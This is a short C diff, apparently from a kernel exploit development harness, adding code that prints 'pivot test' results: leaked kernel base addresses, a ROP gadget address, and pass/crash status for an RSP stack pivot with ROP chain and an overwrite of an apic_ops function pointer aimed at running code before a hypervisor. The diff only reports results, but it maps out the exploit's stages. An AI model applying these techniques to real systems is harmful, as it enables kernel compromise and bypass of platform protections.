@@ -180,6 +180,41 @@ static void _kldload(void* data, size_t data_size)
         printf("  With KRW: overwrite -> suspend/resume -> code runs before HV\n");
 
         printf("\n=== END APIC OPS ===\n");
+    } else if (magic == 0x50495654) { /* "PIVT" - pivot test results */
+        /*
+         * Layout (packed):
+         *   readback[0]: magic(32) | num_tests(32)
+         *   readback[1]: kdata_base
+         *   readback[2]: ktext_base
+         *   readback[3]: nop_ret_addr
+         *   readback[4]: test1_status(32) | test2_status(32)
+         *   readback[5]: apic_ops2_original
+         *   readback[6]: apic_ops2_readback
+         *   readback[7]: test3_status(32) | pad(32)
+         */
+        uint32_t t1 = (uint32_t)(readback[4] & 0xFFFFFFFF);
+        uint32_t t2 = (uint32_t)(readback[4] >> 32);
+        uint32_t t3 = (uint32_t)(readback[7] & 0xFFFFFFFF);
+
+        printf("\n=== PIVOT TEST RESULTS ===\n");
+        printf("  kdata_base:  %#lx\n", readback[1]);
+        printf("  ktext_base:  %#lx\n", readback[2]);
+        printf("  nop_ret @:   %#lx\n", readback[3]);
+
+        printf("\n  Test 1 (call nop_ret):     %s\n",
+               t1 == 1 ? "PASS" : t1 == 0xAAAA ? "CRASHED" : "not reached");
+        printf("  Test 2 (RSP pivot + ROP):  %s\n",
+               t2 == 1 ? "PASS" : t2 == 0xAAAA ? "CRASHED" : "not reached");
+        printf("  Test 3 (apic_ops write):   %s\n",
+               t3 == 1 ? "PASS" : t3 == 0xAAAA ? "CRASHED" :
+               t3 == 0xFFFF ? "WRITE FAILED" : "not reached");
+
+        if (t3 == 1 || t3 == 0xFFFF) {
+            printf("\n  apic_ops[2] original:  %#lx\n", readback[5]);
+            printf("  apic_ops[2] readback:  %#lx\n", readback[6]);
+        }
+
+        printf("\n=== END PIVOT TEST ===\n");
     } else if (magic == 0x47414447) { /* "GADG" - gadget reader results */
         uint32_t num_regions = (uint32_t)(readback[0] >> 32);
         uint64_t rb_kdata = readback[1];
